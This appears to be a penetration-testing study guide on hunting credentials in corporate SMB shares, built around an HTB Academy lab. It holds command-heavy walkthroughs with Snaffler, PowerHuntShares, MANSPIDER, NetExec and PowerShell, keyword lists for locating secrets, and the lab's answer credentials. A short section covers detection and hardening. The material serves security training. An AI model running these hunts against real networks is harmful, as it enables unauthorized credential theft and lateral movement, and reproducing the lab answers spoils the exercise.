# Credential Hunting in Network Shares

## 🎯 Overview

**Network shares credential hunting** focuses on discovering credentials stored in shared network resources like SMB/CIFS shares, network drives, and file servers. Corporate environments heavily rely on network shares for file storage and team collaboration, making them valuable targets that often contain:

- **Configuration files** with embedded credentials
- **Scripts and automation files** containing hardcoded passwords
- **Documentation** with password lists and access information
- **Backup files** including system configs and databases
- **User personal files** with saved credentials
- **Application data** containing connection strings and API keys

> **"Network shares can unintentionally become a goldmine for attackers, especially when sensitive data like plaintext credentials or configuration files are left behind."**

## 🧠 Strategic Approach to Share Hunting

### Target Assessment and Prioritization
```bash
# High-Value Shares (Priority 1)
IT$         # IT department shares
Admin$      # Administrative shares  
C$          # System drives
SYSVOL      # Domain policies and scripts
NETLOGON    # Logon scripts
Backup      # Backup repositories

# Medium-Value Shares (Priority 2)  
Finance     # Financial data and applications
HR          # Human resources information
Development # Source code and configs
Infrastructure # Network and system configs

# Lower-Value Shares (Priority 3)
Marketing   # Marketing materials
Sales       # Sales documents
Public      # General company files
```

### Credential Pattern Recognition
```bash
# High-Priority Keywords
password, passwd, pwd, pass
credential, cred, auth, login
username, user, admin, service
token, key, secret, api
connection, connect, config

# File Extensions of Interest
.ini, .cfg, .conf, .config    # Configuration files
.env, .properties, .settings   # Environment/settings files
.ps1, .bat, .cmd, .sh         # Script files
.xml, .json, .yaml, .yml      # Structured data files
.txt, .log, .bak, .old        # Text and backup files
.xlsx, .docx, .pdf            # Documents with credentials

# Filename Patterns
*password*, *cred*, *auth*     # Credential-related names
*config*, *setting*, *env*     # Configuration files  
*backup*, *old*, *temp*        # Backup and temporary files
*install*, *setup*, *deploy*   # Installation files
```

### Localization Considerations
```bash
# English Environment
user, password, admin, secret, login

# German Environment  
benutzer, passwort, kennwort, anmeldung, geheim

# French Environment
utilisateur, mot_de_passe, connexion, secret

# Spanish Environment
usuario, contraseña, clave, secreto, conexion
```

## 🪟 Windows-Based Share Hunting

### 1. Snaffler - Automated Share Discovery

#### Installation and Basic Usage
```cmd
# Download Snaffler from GitHub releases
# https://github.com/SnaffCon/Snaffler/releases

# Basic domain share scanning
Snaffler.exe -s

# Output to file for analysis
Snaffler.exe -s -o results.txt

# Verbose logging
Snaffler.exe -s -v
```

#### Advanced Snaffler Options
```cmd
# Target specific computers
Snaffler.exe -c DC01,FILE01,WEB01

# Target specific shares
Snaffler.exe -i "\\DC01\IT" -i "\\FILE01\Backup"

# Exclude specific shares
Snaffler.exe -n "\\DC01\Public" -n "\\FILE01\Marketing"

# Search for specific users from Active Directory
Snaffler.exe -s -u

# Custom file pattern matching
Snaffler.exe -s -m KeepConfigRegexRed -f "\.(ini|cfg|conf)$"

# Limit search depth
Snaffler.exe -s -m KeepConfigRegexRed -d 3
```

#### Snaffler Output Interpretation
```cmd
# Color-coded findings
[Red]    - High-value targets (passwords, keys, secrets)
[Yellow] - Medium-value targets (configs, backups)
[Green]  - Low-value but interesting files
[Black]  - Accessible but uninteresting

# Rule Categories
KeepPassOrKeyInCode     # Passwords in code/config files
KeepConfigRegexRed      # High-value configuration files
KeepCertificateKey      # Private keys and certificates
KeepDeployImageByExt    # System images and backups
```

#### Example Snaffler Output Analysis
```cmd
# Critical finding - Password in unattend.xml
[Red]<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>
(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml)
<AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>

# System image backup found
[Yellow]<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>
(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim)
```

### 2. PowerHuntShares - HTML Report Generation

#### Installation and Setup
```powershell
# Download PowerHuntShares
# https://github.com/NetSPI/PowerHuntShares

# Import the module
Import-Module .\PowerHuntShares.ps1

# Or dot source
. .\PowerHuntShares.ps1
```

#### Basic PowerHuntShares Usage
```powershell
# Basic domain scan with HTML report
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\temp\results

# Target specific domain
Invoke-HuntSMBShares -Domain inlanefreight.local -OutputDirectory C:\temp\results

# Scan specific computers
Invoke-HuntSMBShares -ComputerName DC01,FILE01 -OutputDirectory C:\temp\results

# Custom share exclusions
Invoke-HuntSMBShares -ExcludeShares @("print$","ipc$") -OutputDirectory C:\temp\results
```

#### PowerHuntShares Output Structure
```
# Generated files
SmbShareHunt-[timestamp]/
├── summary_report.html           # Interactive HTML dashboard
├── detailed_findings.csv         # All findings in CSV format
├── share_permissions.csv         # Share access permissions
├── file_timeline.csv            # File access/modification timeline
├── high_risk_shares.csv         # Shares with excessive permissions
└── interesting_files.csv        # Files matching credential patterns
```

#### HTML Report Analysis
```html
<!-- Summary Statistics -->
Critical Findings: 5     # High-priority credential discoveries
High Risk: 0            # Dangerous permission configurations  
Medium Risk: 0          # Moderate security concerns
Low Risk: 2            # Minor issues for awareness

<!-- Data Exposure Categories -->
Interesting Files: 21   # Files matching search patterns
Sensitive Files: 2      # Files with restricted content
Secrets Files: 2       # Files containing credentials/keys
```

### 3. Manual PowerShell Share Hunting

#### Basic PowerShell Commands
```powershell
# Enumerate all shares in domain
Get-WmiObject -Class Win32_Share -ComputerName (Get-ADComputer -Filter *).Name

# Search for credential patterns in specific share
Get-ChildItem -Path "\\DC01\IT" -Recurse -Include *.txt,*.ini,*.cfg,*.xml | 
    Select-String -Pattern "password|passwd|pwd|secret|key|token"

# Search for specific file patterns
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *password*,*cred*,*config* |
    Select-Object FullName,Length,LastWriteTime

# Content-based search across multiple shares
$shares = @("\\DC01\IT","\\DC01\Admin","\\DC01\Backup")
foreach ($share in $shares) {
    Get-ChildItem -Path $share -Recurse -Include *.ps1,*.bat,*.cmd |
        Select-String -Pattern "password|secret" | 
        Select-Object Filename,LineNumber,Line
}
```

#### HTB Academy Domain-Specific Search Method
```powershell
# HTB Academy preferred method: Search for domain patterns
# This technique searches for DOMAIN\username patterns in network shares
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"

# Real HTB Academy example output:
# \\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:SecureP@ss123

# Search multiple shares for domain patterns
$shares = @("\\DC01.inlanefreight.local\IT", "\\DC01.inlanefreight.local\HR", "\\DC01.inlanefreight.local\Company")
foreach ($share in $shares) {
    Write-Host "Searching $share for domain credentials..." -ForegroundColor Yellow
    Get-ChildItem -Recurse -Include *.* $share -ErrorAction SilentlyContinue | 
        Select-String -Pattern "INLANEFREIGHT\\|inlanefreight\\" -ErrorAction SilentlyContinue
}

# Alternative domain patterns to search for
$domainPatterns = @("INLANEFREIGHT\\", "inlanefreight\\", "domain\\", "DOM\\")
foreach ($pattern in $domainPatterns) {
    Get-ChildItem -Recurse -Include *.txt,*.cfg,*.ini,*.xml \\DC01\IT | 
        Select-String -Pattern $pattern -ErrorAction SilentlyContinue
}
```

#### Advanced PowerShell Hunting
```powershell
# Function for comprehensive credential hunting
function Search-ShareCredentials {
    param(
        [string[]]$SharePaths,
        [string[]]$Extensions = @("*.txt","*.ini","*.cfg","*.xml","*.ps1","*.bat"),
        [string[]]$Patterns = @("password","passwd","secret","key","token","cred")
    )
    
    foreach ($share in $SharePaths) {
        Write-Host "Scanning: $share" -ForegroundColor Green
        
        # File pattern search
        Get-ChildItem -Path $share -Recurse -Include $Extensions -ErrorAction SilentlyContinue |
            ForEach-Object {
                foreach ($pattern in $Patterns) {
                    $matches = Select-String -Path $_.FullName -Pattern $pattern -ErrorAction SilentlyContinue
                    if ($matches) {
                        [PSCustomObject]@{
                            Share = $share
                            File = $_.FullName
                            Pattern = $pattern
                            LineNumber = $matches.LineNumber
                            Content = $matches.Line
                            LastModified = $_.LastWriteTime
                        }
                    }
                }
            }
    }
}

# Usage example
$targetShares = @("\\DC01\IT","\\DC01\Finance","\\DC01\HR")
Search-ShareCredentials -SharePaths $targetShares
```

## 🐧 Linux-Based Share Hunting

### 1. MANSPIDER - Docker-Based Share Scanner

#### Installation and Setup
```bash
# Pull MANSPIDER Docker container
docker pull blacklanternsecurity/manspider

# Create local directory for output
mkdir ./manspider_results
```

#### Basic MANSPIDER Usage
```bash
# Search for files containing "password"
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -c 'password' -u 'username' -p 'password'

# Search for multiple patterns
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -c 'password|secret|key|token' -u 'mendres' -p 'Inlanefreight2025!'

# Target specific shares
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -s 'IT,Finance,HR' -c 'password' -u 'username' -p 'password'
```

#### Advanced MANSPIDER Options
```bash
# Increase thread count for faster scanning
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -c 'password' -u 'username' -p 'password' -t 20

# Set maximum file size limit (default 10MB)
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -c 'password' -u 'username' -p 'password' --max-file-size 50MB

# Enable verbose output
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -c 'password' -u 'username' -p 'password' -v

# Search by file extension
docker run --rm -v ./manspider_results:/root/.manspider \
    blacklanternsecurity/manspider TARGET_IP \
    -e 'ini,cfg,xml,ps1' -u 'username' -p 'password'
```

#### MANSPIDER Output Analysis
```bash
# Output files location
/root/.manspider/loot/

# Example output
[+] 10.129.234.121: Successful login as "mendres"
[+] Found file matching pattern: \\10.129.234.121\IT\config\database.ini
[+] Found file matching pattern: \\10.129.234.121\Finance\scripts\backup.ps1
[+] Downloaded: /root/.manspider/loot/database.ini
[+] Downloaded: /root/.manspider/loot/backup.ps1
```

### 2. NetExec Spider - Integrated Share Crawler

#### Basic NetExec Spider Usage
```bash
# Step 1: Enumerate available shares and permissions
netexec smb TARGET_IP -u username -p password --shares

# HTB Academy example:
# netexec smb 10.129.232.180 -u mendres -p 'Inlanefreight2025!' --shares
# Expected output shows READ access to: Company, HR, IT, NETLOGON, SYSVOL

# Step 2: Basic spider scan for password patterns
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --content --pattern "password"

# Search multiple patterns
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --content --pattern "password|secret|key"

# Target specific file extensions
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --pattern "\.ini$|\.cfg$|\.xml$"

# Exclude certain directories
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --exclude-dirs "Windows,Program Files"
```

#### Advanced NetExec Spider Options
```bash
# Set maximum file size for content searching
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --content --pattern "password" --max-file-size 1048576

# Include hidden files
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --hidden

# Download matching files
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --pattern "config" --download

# Search with depth limit
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --depth 3

# Regex pattern matching
netexec smb TARGET_IP -u username -p password --spider SHARE_NAME --regex --pattern "password\s*=\s*['\"][^'\"]+['\"]"
```

#### NetExec Spider Output Examples
```bash
# Successful connection and spidering
SMB    10.129.234.121  445    DC01    [*] Windows 10 / Server 2019 Build 17763 x64
SMB    10.129.234.121  445    DC01    [+] inlanefreight.local\mendres:Inlanefreight2025!
SMB    10.129.234.121  445    DC01    [*] Started spidering

# Found matching files
SMB    10.129.234.121  445    DC01    [+] File found: \\DC01\IT\config\app.ini
SMB    10.129.234.121  445    DC01    [+] Match found: "password=secret123"
SMB    10.129.234.121  445    DC01    [+] File found: \\DC01\Finance\backup\database.xml
```

### 3. Manual Linux Share Mounting and Analysis

#### SMB Share Mounting
```bash
# Install SMB client tools
sudo apt install cifs-utils smbclient

# List available shares
smbclient -L //TARGET_IP -U username%password

# Mount share for local analysis
sudo mkdir /mnt/target_share
sudo mount -t cifs //TARGET_IP/SHARE_NAME /mnt/target_share -o username=mendres,password=Inlanefreight2025!

# Alternative mount with credentials file
echo "username=mendres" > creds.txt
echo "password=Inlanefreight2025!" >> creds.txt
echo "domain=inlanefreight.local" >> creds.txt
sudo mount -t cifs //TARGET_IP/IT /mnt/it_share -o credentials=creds.txt
```

#### Local Analysis of Mounted Shares
```bash
# Search for credential patterns
find /mnt/target_share -type f -name "*.txt" -o -name "*.ini" -o -name "*.cfg" -o -name "*.xml" | 
    xargs grep -i -E "(password|passwd|secret|key|token|cred)" 2>/dev/null

# Search for interesting filenames
find /mnt/target_share -type f -iname "*password*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*config*"

# File timeline analysis
find /mnt/target_share -type f -newermt "2024-01-01" -printf "%T@ %Tc %p\n" | sort -n | tail -20

# Large file identification (potential backups)
find /mnt/target_share -type f -size +100M -ls

# Recently modified files
find /mnt/target_share -type f -mtime -30 -ls
```

## 🎯 HTB Academy Lab Exercise

### Lab Environment
- **Target**: Domain-joined Windows system
- **Initial Access**: RDP/WinRM with `mendres:Inlanefreight2025!`
- **Objective**: Discover additional user credentials and domain admin password
- **Available Tools**: Snaffler and PowerHuntShares in `C:\Users\Public`

### Lab Methodology

#### Phase 1: Share Enumeration and Access Verification
```bash
# Step 1: Check accessible shares with NetExec
netexec smb 10.129.232.180 -u mendres -p 'Inlanefreight2025!' --shares

# Expected output:
# SMB    10.129.232.180  445    DC01    Share           Permissions     Remark
# SMB    10.129.232.180  445    DC01    Company         READ        
# SMB    10.129.232.180  445    DC01    HR              READ        
# SMB    10.129.232.180  445    DC01    IT              READ        
# SMB    10.129.232.180  445    DC01    NETLOGON        READ        
# SMB    10.129.232.180  445    DC01    SYSVOL          READ        
```

#### Phase 2: RDP Access and PowerShell Analysis
```bash
# Step 2: Establish RDP connection
xfreerdp /v:10.129.232.180 /u:mendres /p:Inlanefreight2025!
```

```powershell
# Step 3: HTB Academy Domain-Specific Search Method
# Search for INLANEFREIGHT\ pattern in IT share
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"

# Expected result:
# \\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:{password}

# Alternative patterns for thorough search
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\HR | Select-String -Pattern "INLANEFREIGHT\\"
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\Company | Select-String -Pattern "INLANEFREIGHT\\"
```

#### Phase 3: Automated Tool Analysis
```cmd
# Using Snaffler for comprehensive scanning
cd C:\Users\Public
Snaffler.exe -s -o snaffler_results.txt

# Using PowerHuntShares for detailed reporting
Import-Module .\PowerHuntShares.ps1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\temp\hunt_results
```

#### Phase 4: Advanced Pattern Matching
```powershell
# Search for various credential patterns
Get-ChildItem -Path "\\DC01\IT" -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.ps1 |
    Select-String -Pattern "password|passwd|secret|user|admin"

# Search for domain-specific patterns
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *.txt,*.cfg,*.ini |
    Select-String -Pattern "inlanefreight\\|INLANEFREIGHT\\|domain\\|administrator"

# Search for backup/auth-related files
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *backup*,*auth*,*cred*,*password* |
    Select-Object FullName,LastWriteTime
```

### Lab Questions Analysis

#### Question 1: Domain User Credentials
**Objective**: Find valid credentials of another domain user in mendres accessible shares

**HTB Academy Methodology**:
```powershell
# Step 1: Use PowerShell domain pattern search in IT share
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"

# Expected result:
# \\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

# Step 2: Extract discovered credentials
# Username: jbader
# Password: ILovePower333###
```

**Alternative Search Methods**:
```cmd
# Automated tool approach
Snaffler.exe -s -u  # Include user enumeration from AD

# Manual pattern search across shares  
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *.txt,*.ini,*.cfg |
    Select-String -Pattern "user.*=|username.*=|login.*=" -Context 2

# Authentication file discovery
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *auth*,*login*,*user* |
    ForEach-Object { Get-Content $_.FullName | Select-String "password|pass" }
```

#### Question 2: Domain Administrator Password
**Objective**: Use discovered user credentials to access additional shares and find domain admin password

**HTB Academy Methodology**:
```bash
# Step 1: Use discovered credentials (jbader:ILovePower333###) from Question 1
# Spider HR share specifically for Administrator pattern
netexec smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"

# Expected output:
# SMB    10.129.234.173  445    DC01    [+] inlanefreight.local\jbader:ILovePower333###
# SMB    10.129.234.173  445    DC01    //10.129.234.173/HR/Confidential/Onboarding_Docs_132.txt [pattern:'Administrator']

# Step 2: Connect to HR share using smbclient with discovered credentials
smbclient //10.129.232.180/HR -U jbader
# Password: ILovePower333###

# Step 3: Navigate to Confidential directory and download the file
# smb: \> cd Confidential
# smb: \Confidential\> get Onboarding_Docs_132.txt
# smb: \Confidential\> exit

# Step 4: Read file contents to extract Administrator password
cat Onboarding_Docs_132.txt
```

**Example File Contents** (Onboarding_Docs_132.txt):
```
========================================
Employee Onboarding Checklist
========================================

Name: Josh Bader  
Start Date: 2025-04-29  
Department: IT Infrastructure  
Manager: R. Lawson  
Title: Systems Engineer III  
Role Level: Tier-0 Admin  

Checklist:
[✔] AD Account Created  
[✔] Email Provisioned  
[✔] Assigned to Admin VPN Group  
[✔] Azure Admin Portal Access  
[✔] Exchange Online Admin  
[✔] Domain Admin Rights Applied  

Notes:
Jordan will be responsible for oversight of Active Directory replication, 
GPO management, and DC patching. Temporarily granted access to the domain 
administrator account for initial 90 days to complete infrastructure tasks 
related to the Chicago DC migration.

Account credentials
**Username:** Administrator  
**Password:** {Domain_Admin_Password}  

Note: Update account group membership after probationary period.
```

**Alternative PowerShell Method**:
```powershell
# Search HR share for administrator-related content
Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *.txt,*.docx,*.pdf |
    Select-String -Pattern "administrator|admin.*password|domain.*admin" -Context 3

# Search for onboarding/HR documentation
Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *onboard*,*admin*,*credential* |
    Select-Object FullName,LastWriteTime
```

### Common Discovery Patterns

#### Pattern 1: Configuration Files with Embedded Credentials
```ini
# Example: database.ini
[connection]
server=db01.inlanefreight.local
username=dbadmin
password=DBP@ssw0rd123!
database=production
```

#### Pattern 2: PowerShell Scripts with Hardcoded Credentials
```powershell
# Example: backup_script.ps1
$username = "backup_service"
$password = "BackupS3rv1ce!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
```

#### Pattern 3: Documentation Files with Password Lists
```text
# Example: admin_passwords.txt
Domain Administrator: DomAdm1n2025!
SQL Service Account: SQL_S3rv1ce_P@ss
Backup Service: Backup_2025_Secure!
Exchange Admin: Exch@nge_Adm1n
```

## 📋 Share Hunting Best Practices

### Pre-Engagement Preparation
```bash
# Credential validation
netexec smb TARGET_IP -u username -p password

# Share enumeration  
netexec smb TARGET_IP -u username -p password --shares

# Permission assessment
netexec smb TARGET_IP -u username -p password --shares --check-access
```

### Systematic Hunting Approach
```bash
# 1. High-value share prioritization
- ADMIN$, C$, SYSVOL, NETLOGON
- IT, Infrastructure, Backup shares
- Service-specific shares (SQL, Exchange, etc.)

# 2. Pattern-based searching
- Keywords: password, secret, key, token, admin
- File types: .ini, .cfg, .xml, .ps1, .txt
- Naming patterns: *config*, *cred*, *admin*

# 3. Temporal analysis
- Recently modified files (last 30 days)
- Large files (potential backups)
- Hidden files and directories
```

### Results Documentation
```bash
# Create structured findings log
Share: \\DC01\IT\configs\
File: app.ini
Pattern: "password=secret123"
Context: Database connection string
Timestamp: 2025-01-15 14:30:00
Validated: YES
```

## 🛡️ Detection and Prevention

### Share Security Hardening
```bash
# Access control recommendations
- Implement least-privilege access
- Regular access review and cleanup
- Monitor share access logs
- Remove default administrative shares

# Content security
- Scan for embedded credentials
- Implement DLP solutions
- Encrypt sensitive files
- Regular security audits
```

### Monitoring for Share Hunting
```bash
# Detection indicators
- Multiple share enumeration attempts
- Unusual file access patterns
- Large-scale file downloads
- Access to administrative shares

# Log analysis
- Windows Security Event 5140 (share access)
- SMB traffic analysis
- File access auditing
- Unusual authentication patterns
```

## 💡 Key Takeaways

1. **Share prioritization** - Focus on high-value targets (IT, Admin, Backup shares)
2. **Multi-tool approach** - Combine automated tools with manual verification
3. **Pattern recognition** - Learn common credential storage patterns in corporate environments
4. **Systematic methodology** - Follow consistent search strategies across all accessible shares
5. **Credential chaining** - Use discovered credentials to access additional shares
6. **Documentation focus** - Look for IT documentation and configuration files
7. **Temporal analysis** - Recent files often contain current credentials
8. **Cross-platform capability** - Effective hunting from both Windows and Linux systems

---

*This comprehensive guide covers network share credential hunting techniques using Snaffler, PowerHuntShares, MANSPIDER, and NetExec, based on HTB Academy's Password Attacks module.* 